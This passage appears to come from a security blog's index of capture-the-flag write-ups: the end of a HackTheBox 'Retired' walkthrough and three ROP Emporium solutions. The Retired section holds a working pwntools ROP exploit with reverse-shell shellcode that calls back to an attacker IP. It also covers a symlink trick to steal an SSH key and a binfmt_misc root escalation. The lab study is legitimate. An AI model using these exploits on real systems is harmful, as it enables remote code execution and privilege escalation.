r-xp 00001000 08:01 2408 /usr/bin/activate_license56194c7ca000-56194c7cb000 r--p 00002000 08:01 2408 /usr/bin/activate_license56194c7cb000-56194c7cc000 r--p 00002000 08:01 2408 /usr/bin/activate_license56194c7cc000-56194c7cd000 rw-p 00003000 08:01 2408 /usr/bin/activate_license56194e392000-56194e3b3000 rw-p 00000000 00:00 0 [heap]7f041bfab000-7f041bfad000 rw-p 00000000 00:00 0 7f041bfad000-7f041bfae000 r--p 00000000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f041bfae000-7f041bfb0000 r-xp 00001000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f041bfb0000-7f041bfb1000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f041bfb1000-7f041bfb2000 r--p 00003000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f041bfb2000-7f041bfb3000 rw-p 00004000 08:01 3635 /usr/lib/x86_64-linux-gnu/libdl-2.31.so7f041bfb3000-7f041bfba000 r--p 00000000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f041bfba000-7f041bfca000 r-xp 00007000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f041bfca000-7f041bfcf000 r--p 00017000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f041bfcf000-7f041bfd0000 r--p 0001b000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f041bfd0000-7f041bfd1000 rw-p 0001c000 08:01 3645 /usr/lib/x86_64-linux-gnu/libpthread-2.31.so7f041bfd1000-7f041bfd5000 rw-p 00000000 00:00 0 7f041bfd5000-7f041bfe4000 r--p 00000000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f041bfe4000-7f041c07e000 r-xp 0000f000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f041c07e000-7f041c117000 r--p 000a9000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f041c117000-7f041c118000 r--p 00141000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f041c118000-7f041c119000 rw-p 00142000 08:01 3636 /usr/lib/x86_64-linux-gnu/libm-2.31.so7f041c119000-7f041c13e000 r--p 00000000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c13e000-7f041c289000 r-xp 00025000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c289000-7f041c2d3000 r--p 00170000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c2d3000-7f041c2d4000 ---p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c2d4000-7f041c2d7000 r--p 001ba000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c2d7000-7f041c2da000 rw-p 001bd000 08:01 3634 /usr/lib/x86_64-linux-gnu/libc-2.31.so7f041c2da000-7f041c2de000 rw-p 00000000 00:00 0 7f041c2de000-7f041c2ee000 r--p 00000000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.67f041c2ee000-7f041c3e6000 r-xp 00010000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.67f041c3e6000-7f041c41a000 r--p 00108000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.67f041c41a000-7f041c41e000 r--p 0013b000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.67f041c41e000-7f041c421000 rw-p 0013f000 08:01 5321 /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.67f041c421000-7f041c423000 rw-p 00000000 00:00 0 7f041c428000-7f041c429000 r--p 00000000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f041c429000-7f041c449000 r-xp 00001000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f041c449000-7f041c451000 r--p 00021000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f041c452000-7f041c453000 r--p 00029000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f041c453000-7f041c454000 rw-p 0002a000 08:01 3630 /usr/lib/x86_64-linux-gnu/ld-2.31.so7f041c454000-7f041c455000 rw-p 00000000 00:00 0 7ffd7e9ce000-7ffd7e9ef000 rw-p 00000000 00:00 0 [stack]7ffd7e9f5000-7ffd7e9f9000 r--p 00000000 00:00 0 [vvar]7ffd7e9f9000-7ffd7e9fb000 r-xp 00000000 00:00 0 [vdso]=============================[ PID: 599 ]================================[cmdline] nginx: worker process[maps]( ... )=============================[ PID: 600 ]================================[cmdline] nginx: worker process[maps](...)=============================[ PID: 615 ]================================[cmdline] php-fpm: pool www[maps]^COK, we found the activate_license binary at PID 417. It was started from /usr/bin/activate_license path. Let’s download it:$ wget 'http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_license' -O activate_license.b64--2022-04-03 09:11:42-- http://retired.htb/index.php?page=php://filter/convert.base64-encode/resource=/usr/bin/activate_licenseConnecting to retired.htb:80... connected.HTTP request sent, awaiting response... 200 OKLength: unspecified [text/html]Saving to: 'activate_license. b64'activate_license.b64 [ &lt;=&gt; ] 29.34K 142KB/s in 0.2s 2022-04-03 09:11:43 (142 KB/s) - 'activate_license.b64' saved [30048]$ cat activate_license.b64 | base64 -d &gt; activate_license.binAlso, let’s download other libs used by that program (libc and libsqlite) because they could be helpful in later stages.After opening the activate_license application in Ghidra, we can see that we can trigger a buffer overflow in the activate_license() function because there are no checks for message length:So right now, with that information, we’re ready for the next stage.ExploitationWe need to check what security measures are compiled in binary. We can do it with the checksec tool:checksec ./activate_license.bin [*] '/home/kali/htb/machines/retired/activate_license.bin' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabledThis and randomize_va_space: 2 from the ruby script output means that: we have ASLR enabled - addresses are randomised every time program is started, there’s Full RELRO, so we cant overwrite .plt or .got tables and NX bit protection - we can’t execute code on stack unless we enable executable flag on that memory part. We can do it by calling mprotect() and changing memory flags to RWX for the whole stack. mprotect() call uses three arguments for address, size, and memory flags, so we must control RDI, RSI, and RDX. Here are POP / RET gadgets from the activate_license binary:ROPgadget --binary ./activate_license.bin --only \"pop|ret\" Gadgets information============================================================0x0000000000001814 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001816 : pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001818 : pop r14 ; pop r15 ; ret0x000000000000181a : pop r15 ; ret0x0000000000001813 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001817 : pop rbp ; pop r14 ; pop r15 ; ret0x00000000000012ef : pop rbp ; ret0x000000000000181b : pop rdi ; ret0x0000000000001819 : pop rsi ; pop r15 ; ret0x0000000000001815 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x0000000000001016 : ret0x000000000000174f : ret 0x2bf0x0000000000001202 : ret 0x2d0x00000000000013b9 : ret 0x8d480x000000000000175d : ret 0xb70fOK, we need more. First, let’s see what’s in the libc library:ROPgadget --binary ./libc-2.31.so --only \"pop|ret\"Gadgets information============================================================( ... )0x0000000000027355 : pop rdi ; pop rbp ; ret0x0000000000026796 : pop rdi ; ret0x00000000000f948d : pop rdx ; pop r12 ; ret0x000000000008946a : pop rdx ; pop rbp ; pop r12 ; ret0x0000000000137782 : pop rdx ; pop rbx ; ret0x00000000000e4e19 : pop rdx ; pop rcx ; pop rbx ; ret0x00000000000cb1cd : pop rdx ; ret0x0000000000027353 : pop rsi ; pop r15 ; pop rbp ; ret0x0000000000026794 : pop rsi ; pop r15 ; ret0x000000000002890f : pop rsi ; ret0x000000000002734f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret0x0000000000026790 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000002890b : pop rsp ; pop r13 ; pop r14 ; ret0x000000000003dd16 : pop rsp ; pop r13 ; pop rbp ; ret0x0000000000028488 : pop rsp ; pop r13 ; ret0x000000000010aead : pop rsp ; pop rbp ; ret0x0000000000026e9b : pop rsp ; ret0x0000000000056174 : pop rsp ; ret 0x64c00x00000000000d82ef : pop rsp ; ret 0x66080x00000000000d7f96 : pop rsp ; ret 0xeb08(...)All required POP/RET gadgets are in libc, so we can use them from there:0x0000000000026796 : pop rdi ; ret0x000000000002890f : pop rsi ; ret0x00000000000cb1cd : pop rdx ; retNext, we need an offset of mprotect(). Again, we can get it with the readelf tool:readelf -s libc-2.31.so | grep mprotect 1225: 00000000000f8c20 33 FUNC WEAK DEFAULT 14 mprotect@@GLIBC_2.2.5And the last gadget to execute our code on a stack is JMP RSP - it can be found in the libsqlite library:ROPgadget --binary ./libsqlite3.so.0.8.6 --only \"jmp\" | grep rsp 0x00000000000d431d : jmp rspWe have gadgets, so let’s write a script to help us get the padding size. First, we’ll use the cyclic_metasploit() function from pwntools which generates the De Bruijn sequence (the Metasploit version):#!/usr/bin/env python3from pwn import *import timecontext.log_level= \"debug\"p = remote(\"127.0.0.1\", 1337)atexit.register(p.clean_and_log)# buffer where read() stores the data has 512 bytes, so let's try something bigger a bitpayload_size = 640payload = b\"\"payload += p32(payload_size, endian='big')payload += cyclic_metasploit(payload_size)time.sleep(5.0)p.send(payload)p.interactive()Next, run the target binary in gdb (left pane on the screenshot below) and the above script (right pane):We’ve got a match at the offset 520 in the generated pattern, so we must send 520 bytes of padding before our actual payload. With that information, we can start writing our exploit (at this moment, for localhost, we need to check if it’s working correctly):#!/usr/bin/env python3from pwn import *import timecontext.log_level=\"debug\"# locallibc_base = 0x7ffff7c62000libsqlite_base = 0x7ffff7e43000stack_base = 0x7ffffffde000stack_end = 0x7ffffffff000mprotect = 0x00000000001017b0pop_rdi = 0x0000000000027725pop_rsi = 0x0000000000028ed9pop_rdx = 0x00000000000fdd4djmp_rsp = 0x00000000000aa776def prepare_shellcode(ip, port): # msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload # [-] No arch selected, selecting arch: x64 from the payload # No encoder specified, outputting raw payload # Payload size: 74 bytes # Final size of python file: 432 bytes shellcode = b\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\" shellcode += b\"\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\" shellcode += int(port).to_bytes(2, 'big') shellcode += socket.inet_aton(ip) shellcode += b\"\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\" shellcode += b\"\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\" shellcode += b\"\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\" shellcode += b\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\" shellcode += b\"\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\" log.info(f'{hexdump(shellcode)}') return shellcodedef setup_mprotect(): # setup mprotect call to make stack RWX payload = p64(libc_base + pop_rdi) payload += p64(stack_base) # address payload += p64(libc_base + pop_rsi) payload += p64(stack_end - stack_base) # size payload += p64(libc_base + pop_rdx) payload += p64(7) # flags: R + W + X payload += p64(libc_base + mprotect) # call mprotect return payloadp = remote(\"127.0.0.1\", 1337)atexit.register(p.clean_and_log)offset = 520padding = b\"\\x90\" * offsetshellcode = prepare_shellcode(\"127.0.0.1\", 5555)payload = paddingpayload += setup_mprotect()payload += p64(libsqlite_base + jmp_rsp)payload += shellcodelog.info(f\"payload:\\n{hexdump(payload)}\")fake_license = p32(len(payload), endian='big')fake_license += payloadlog.info(f\"fake_license:\\n{hexdump(fake_license)}\")p.send(fake_license)p.interactive()But first, test it and check if we can spawn a shell on localhost:Yup, we’ve got shell! Next, we need to get actual base addresses for the activate_license program on the remote host and put them in our script:#!/usr/bin/env python3from pwn import *import sysimport requestscontext.log_level=\"debug\"# remotelibc_base = 0x7ff8f3985000libsqlite_base = 0x7ff8f3b4a000stack_base = 0x7ffdcae0b000stack_end = 0x7ffdcae2c000mprotect = 0x00000000000f8c20pop_rdi = 0x0000000000026796pop_rsi = 0x000000000002890fpop_rdx = 0x00000000000cb1cdjmp_rsp = 0x00000000000d431ddef prepare_shellcode(ip, port): # msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=7777 EXITFUNC=thread -f python -v shellcode # [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload # [-] No arch selected, selecting arch: x64 from the payload # No encoder specified, outputting raw payload # Payload size: 74 bytes # Final size of python file: 432 bytes shellcode = b\"\" shellcode += b\"\\x6a\\x29\\x58\\x99\\x6a\\x02\\x5f\\x6a\\x01\\x5e\\x0f\" shellcode += b\"\\x05\\x48\\x97\\x48\\xb9\\x02\\x00\" shellcode += int(port).to_bytes(2, 'big') shellcode += socket.inet_aton(ip) shellcode += b\"\\x51\\x48\\x89\\xe6\\x6a\\x10\\x5a\\x6a\\x2a\" shellcode += b\"\\x58\\x0f\\x05\\x6a\\x03\\x5e\\x48\\xff\\xce\\x6a\\x21\" shellcode += b\"\\x58\\x0f\\x05\\x75\\xf6\\x6a\\x3b\\x58\\x99\\x48\\xbb\" shellcode += b\"\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x00\\x53\\x48\\x89\" shellcode += b\"\\xe7\\x52\\x57\\x48\\x89\\xe6\\x0f\\x05\" log.info(f'{hexdump(shellcode)}') return shellcodedef setup_mprotect(): # setup mprotect call to make stack RWX payload = p64(libc_base + pop_rdi) payload += p64(stack_base) # address payload += p64(libc_base + pop_rsi) payload += p64(stack_end - stack_base) # size payload += p64(libc_base + pop_rdx) payload += p64(7) # flags: R + W + X payload += p64(libc_base + mprotect) # call mprotect return payloadRHOST = \"retired.htb\"LHOST = \"10.10.16.3\"LPORT = 5555offset = 520padding = b\"\\x90\" * offsetshellcode = prepare_shellcode(LHOST, LPORT)payload = paddingpayload += setup_mprotect()payload += p64(libsqlite_base + jmp_rsp)payload += shellcodelog.info(f\"payload:\\n{hexdump(payload)}\")url = f\"http://{RHOST}/activate_license.php\"log.info(f\"Sending request to: {url}\")requests.post(url, files = { \"licensefile\": payload } )Now we’re ready to run it, and…again, we’ve got a shell 😀Enumeration - part 2First, we need to check what potential vulnerabilities or holes in a configuration are on this host. We can check for non-standard SUID programs with find utility, but nothing unusual exists:www-data@retired:/var/www$ find / -type f -perm /4000 -exec ls -alh {} \\; 2&gt;/dev/nullfind / -type f -perm /4000 -exec ls -alh {} \\; 2&gt;/dev/null-rwsr-xr-x 1 root root 44K Feb 7 2020 /usr/bin/newgrp-rwsr-xr-x 1 root root 63K Feb 7 2020 /usr/bin/passwd-rwsr-xr-x 1 root root 58K Feb 7 2020 /usr/bin/chfn-rwsr-xr-x 1 root root 35K Feb 26 2021 /usr/bin/fusermount-rwsr-xr-x 1 root root 87K Feb 7 2020 /usr/bin/gpasswd-rwsr-xr-x 1 root root 71K Jan 20 2022 /usr/bin/su-rwsr-xr-x 1 root root 52K Feb 7 2020 /usr/bin/chsh-rwsr-xr-x 1 root root 179K Feb 27 2021 /usr/bin/sudo-rwsr-xr-x 1 root root 55K Jan 20 2022 /usr/bin/mount-rwsr-xr-x 1 root root 35K Jan 20 2022 /usr/bin/umount-rwsr-xr-- 1 root messagebus 51K Feb 21 2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper-rwsr-xr-x 1 root root 471K Mar 13 2021 /usr/lib/openssh/ssh-keysignAlso, checking the system with LinPEAS gives little more information. From the previous stage, we know that there is a dev user. Let’s check his home directory. Unfortunately, we don’t have enough permissions to check what’s inside. The shell is spawned in /var/www directory for user www-data. After looking around, we can notice three ZIP files. They contain a backup of the /var/www/html directory, and they’re done periodically every minute. We can exploit this behaviour in the next stage.Lateral movementWe’ve learned about users on the host from the previous stages, so the short escalation path will look like this: www-data → dev → root.We can make a symlink attack - symlink /home/dev folder inside /var/www/html, so it will be archived by the backup script. After a few minutes (and a few tries), we’ve got /home/dev archived (the ZIP file size is different than other files). When we unpack it, we can get SSH private key for the dev user in var/www/html/dev/.ssh folder:After login in as a dev user, we see a user flag and a few folders created: activate_license and emuemu.The first one contains sources of the activate_license program, and in the second one, there are two source files: emuemu.c and reg_helper.c. Emuemu.c is just a stub, but reg_helper.c is more interesting, as it contains a code which writes to /proc/sys/fs/binfmt_misc/register. According to Makefile reg_helper file is copied into /usr/lib/emuemu/ folder. Also, it has capabilities: cap_dac_override=ep set, which bypasses file read, write, and execute permission checks.Let’s verify if it’s installed.dev@retired:~$ find /usr -type f -name reg_helper -exec ls -alh {} \\; 2&gt;/dev/null-rwxr-x--- 1 root dev 17K Oct 13 2021 /usr/lib/emuemu/reg_helperPrivilege escalationThere is an excellent post about binfmt_misc exploitation: https://www.sentinelone.com/blog/shadow-suid-privilege-persistence-part-2/, and we can use information from there to exploit binfmt_misc on this box. We reuse a simple interpreter from that article:#include &lt;sys/types.h&gt;#include &lt;unistd.h&gt;int main(int argc, char * argv[], char * envp[]){ char * my_args[] = { \"/bin/bash\", NULL }; setuid(0); setgid(0); execve(my_args[0], my_args, envp);}Now, we can create a hex pattern for the binfmt_misc register with dd and Perl. I’ve picked a su program, but you can choose any other with the SUID attribute set.dd if=/bin/su bs=1 count=121 status=none | perl -pe 's/(.)/sprintf(\"\\\\x%02x\", ord($1))/eg'echo ':x:M::\\x7f\\x45\\x4c\\x46\\x02\\x01\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x3e\\x00\\x01\\x00\\x00\\x00\\xd0\\x38\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xa8\\x11\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x38\\x00\\x0b\\x00\\x40\\x00\\x1d\\x00\\x1c\\x00\\x06\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03::/home/dev/i:OC' | /usr/lib/emuemu/reg_helperAfter sending the pattern with parameters to the reg_helper program, we can escalate our privileges to the root user by running our chosen SUID program:" }, { "title": "ROP Emporium - callme (x64) - writeup", "url": "/posts/rop-emporium-callme/", "categories": "Writeup, ROP Emporium", "tags": "rop, emporium, x64, callme, writeup, pwntools", "date": "2023-03-14 23:27:03 +0000", "snippet": "In this task we need to call three functions: callme_one, callme_two and callme_three in exact order, also with proper function arguments. As mentioned on the challenge page, x86_64 binary uses dou...", "content": "In this task we need to call three functions: callme_one, callme_two and callme_three in exact order, also with proper function arguments. As mentioned on the challenge page, x86_64 binary uses doubled arguments: 0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d . Let’s do it!As I mentioned in the split writeup, Linux and other Unix-like systems store first six function arguments in the following registers: RDI, RSI, RDX, RCX, R8, R9. Because we’re going to use three parameters we should focus on pop/ret ROP Gadgets operating on RDI, RSI, and RDX:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/callme]└─$ [2023-03-14 23:59:42] ROPgadget --binary ./callme --only \"pop|ret\" Gadgets information============================================================0x000000000040099c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040099e : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004009a0 : pop r14 ; pop r15 ; ret0x00000000004009a2 : pop r15 ; ret0x000000000040099b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040099f : pop rbp ; pop r14 ; pop r15 ; ret0x00000000004007c8 : pop rbp ; ret0x000000000040093c : pop rdi ; pop rsi ; pop rdx ; ret0x00000000004009a3 : pop rdi ; ret0x000000000040093e : pop rdx ; ret0x00000000004009a1 : pop rsi ; pop r15 ; ret0x000000000040093d : pop rsi ; pop rdx ; ret0x000000000040099d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004006be : retUnique gadgets found: 14OK, so RDI, and RDX are easy ones: 0x00000000004009a3 : pop rdi ; ret and 0x000000000040093e : pop rdx ; ret, but RSI looks like a bit tricky one. From the three gadgets this: 0x00000000004009a1 : pop rsi ; pop r15 ; retseems to be the easiest one to use, we just need to put two values on the stack instead of one (to fill unused by us r15 register). So, let’s make a python function which will prepare function arguments based on ROP gadgets we’re going to use:def prepare_args(): stack = p64(0x0004009a3) # pop rdi ; ret stack += p64(0xdeadbeefdeadbeef) stack += p64(0x0004009a1) # pop rsi ; pop r15 ; ret stack += p64(0xcafebabecafebabe) stack += p64(0x0) # r15 (unused) stack += p64(0x00040093e) # pop rdx ; ret stack += p64(0xd00df00dd00df00d) return stackNext, because callme_ functions are placed in libcallme.so library we need to use PLT to get their adresses (as mentioned on challenge page). We can use pwntools functionality for that. Putting it all together, our exploit looks like this:from pwn import *context.log_level=\"debug\"elf = context.binary = ELF(\"callme\")gs = '''break main'''def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path)def prepare_args(): stack = p64(0x0004009a3) # pop rdi ; ret stack += p64(0xdeadbeefdeadbeef) stack += p64(0x0004009a1) # pop rsi ; pop r15 ; ret stack += p64(0xcafebabecafebabe) stack += p64(0x0) # r15 (unused) stack += p64(0x00040093e) # pop rdx ; ret stack += p64(0xd00df00dd00df00d) return stackio = start()io.recvuntil(b\"&gt; \")payload = b\"A\" * 40 payload += prepare_args()payload += p64(elf.plt.callme_one)payload += prepare_args()payload += p64(elf.plt.callme_two)payload += prepare_args()payload += p64(elf.plt.callme_three)io.sendline(payload)io.interactive()Let’s run it:Bingo, we’ve got the flag!" }, { "title": "ROP Emporium - split (x64) - writeup", "url": "/posts/rop-emporium-split/", "categories": "Writeup, ROP Emporium", "tags": "rop, emporium, x64, split, writeup, pwntools", "date": "2023-03-13 21:07:31 +0000", "snippet": "Split is a second challenge from ROP Emporium where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting!First of all, checksec:┌──(...", "content": "Split is a second challenge from ROP Emporium where your goal is to find elements scattered all over the binary and use them to get the flag. So, let’s start our hunting!First of all, checksec:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/split]└─$ [2023-03-14 22:48:20] checksec ./split [*] '/home/kali/ropemporium/split/split' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)So, as in previous binary also here NX bit is set.Let’s check in Ghidra what’s inside this binary:OK, there’s pwnme() function and it looks like a target (same as in first challenge):There’s also usefulFunction() hidden, which is using system() call:Unfortunately for us, its parameter is /bin/ls so we need to find a way to provide proper parameter. After fiddling around we found something in Labels - there’s /bin/cat flag.txt string hidden, at address 0x00601060, we can use it in system() call. All we need is to chain all that findings.So, to make this working we need to swap /bin/ls into /bin/cat flag.txt. Linux (and other Unix and Unix-like operating systems) follows System V AMD64 ABI where function arguments (first six) are stored in the following registers: RDI, RSI, RDX, RCX, R8, R9. To switch first argument we need to find pop/ret ROP gadget operating on RDI register:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/split]└─$ [2023-03-14 22:33:58] ROPgadget --binary ./split --only \"pop|ret\" Gadgets information============================================================0x00000000004007bc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007be : pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007c0 : pop r14 ; pop r15 ; ret0x00000000004007c2 : pop r15 ; ret0x00000000004007bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret0x00000000004007bf : pop rbp ; pop r14 ; pop r15 ; ret0x0000000000400618 : pop rbp ; ret0x00000000004007c3 : pop rdi ; ret0x00000000004007c1 : pop rsi ; pop r15 ; ret0x00000000004007bd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret0x000000000040053e : ret0x0000000000400542 : ret 0x200aUnique gadgets found: 12And here it is: 0x00000000004007c3 : pop rdi ; ret so this is our first element in chain, next is the address of /bin/cat string found earlier, and last one would be an address to system() call. Putting it all together in pwntools script:from pwn import *context.log_level=\"debug\"elf = context.binary = ELF(\"split\")gs = '''break main'''def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path)io = start()io.recvuntil(b\"&gt; \")payload = b\"A\" * 40 payload += p64(0x004007c3) # pop rdi; retpayload += p64(0x00601060) # /bin/cat flag.txtpayload += p64(0x0040074b) # system()io.sendline(payload)io.interactive()Let’s check how it’s working:And voila, flag is ours! 🙂" }, { "title": "ROP Emporium - ret2win (x64) - writeup", "url": "/posts/rop-emporium-ret2win/", "categories": "Writeup, ROP Emporium", "tags": "rop, emporium, x64, ret2win, writeup, pwntools", "date": "2023-03-09 20:02:01 +0000", "snippet": "ret2win is the first challenge in ROP Emporium series whereyou need to create very simple ROP to call specific functionin binary to get the flag.As mentioned on challenge page we need to feed a bin...", "content": "ret2win is the first challenge in ROP Emporium series whereyou need to create very simple ROP to call specific functionin binary to get the flag.As mentioned on challenge page we need to feed a binary with a padding bytes followed by a ROP chain - which in this challenge is an address of specific function - ret2win().Also there is additional information about the size of the payload which triggers buffer overflow - it’s 40 bytes.Ok, so lets start. First download and unzip binary, after that next thing is to check what security settings are enabled, ypu can use checksec tool from pwntools:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]└─$ [2023-03-9 21:36:09] checksec ./ret2win [*] '/home/kali/ropemporium/ret2win/ret2win' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)As we see in the output above NX bit is enabled, so we can’t execute our code directly on the stack, also there is partial RELRO.Ok, so whats next? Let’s check what’s inside with Ghidra. As you can see on the image below except main() function there’re also pwnme() and ret2win()Let’s check what is in the pwnme() function:And last but not least, ret2win() function:pwnme() this function has a buffer overflow mentioned on a challenge page - it’s taking 56 bytes and writing it to the 32 bytes buffer. Now, we need to confirm how many bytes we need to put to make buffer overflow and control RSP register. We can use msf-pattern_create and msf-pattern_offset tools for that. First we need to create a pattern:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]└─$ [2023-03-12 17:38:57] msf-pattern_create -l 64 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0ANext, after pattern is created, we need to run ret2win binary in gdb, and use a pattern in read() call:Ok, binary has crashed. In the gdb context we can see that RSP has b3Ab4Ab5 pattern, let’s check it in by using msf-pattern_offset:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]└─$ [2023-03-12 17:51:39] msf-pattern_offset -q b3Ab [*] Exact match at offset 40Ok, so the size of padding is 40 as mentioned on challenge page, after we verified padding size we need to put proper function address. Let’s create simple pwntools script to test that:from pwn import *context.log_level=\"debug\"elf = context.binary = ELF(\"ret2win\")gs = '''continue'''def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path)io = start()io.recvuntil(b\"&gt; \")address = b\"B\" * 8payload = b\"A\" * 40 + addressio.sendline(payload)io.interactive()After running above script (python3 exploit.py GDB) we can see that program crashed with segmentation fault and RSP contains BBBBBBBB string as expected, so we’re controling that register:So, now we need to put a proper address at the end of our payload. We can use gdb disassemble get the address of ret2win() function:pwndbg&gt; disassemble ret2winDump of assembler code for function ret2win: 0x0000000000400756 &lt;+0&gt;: push rbp 0x0000000000400757 &lt;+1&gt;: mov rbp,rsp 0x000000000040075a &lt;+4&gt;: mov edi,0x400926 0x000000000040075f &lt;+9&gt;: call 0x400550 &lt;puts@plt&gt; 0x0000000000400764 &lt;+14&gt;: mov edi,0x400943 0x0000000000400769 &lt;+19&gt;: call 0x400560 &lt;system@plt&gt; 0x000000000040076e &lt;+24&gt;: nop 0x000000000040076f &lt;+25&gt;: pop rbp 0x0000000000400770 &lt;+26&gt;: ret End of assembler dump.pwndbg&gt; We can use 0x0040075a (jumping over function prologue) and if everything goes as expected we should do buffer overflow and call ret2win() which will print the flag. Let’s update our pwntools script with the proper address:from pwn import *context.log_level=\"debug\"elf = context.binary = ELF(\"ret2win\")gs = '''continue'''def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) else: return process(elf.path)io = start()io.recvuntil(b\"&gt; \")address = p64(0x0040075a)payload = b\"A\" * 40 + addressio.sendline(payload)io.interactive()After running our final exploit, we got the flag:┌──(py3)─(kali㉿playground-kali)-[~/ropemporium/ret2win]└─$ [2023-03-12 21:30:14] python3 exploit.py [*] '/home/kali/ropemporium/ret2win/ret2win' Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)[+] Starting local process '/home/kali/ropemporium/ret2win/ret2win' argv=[b'/home/kali/ropemporium/ret2win/ret2win'] : pid 1426237[DEBUG] Received 0x100 bytes: b'ret2win by ROP Emporium\\n' b'x86_64\\n' b'\\n' b'For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\\n' b'What could possibly go wrong?\\n' b\"You there, may I have your input please? And don't worry about null bytes, we're using read()!\\n\" b'\\n' b'&gt; '[DEBUG] Sent 0x31 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 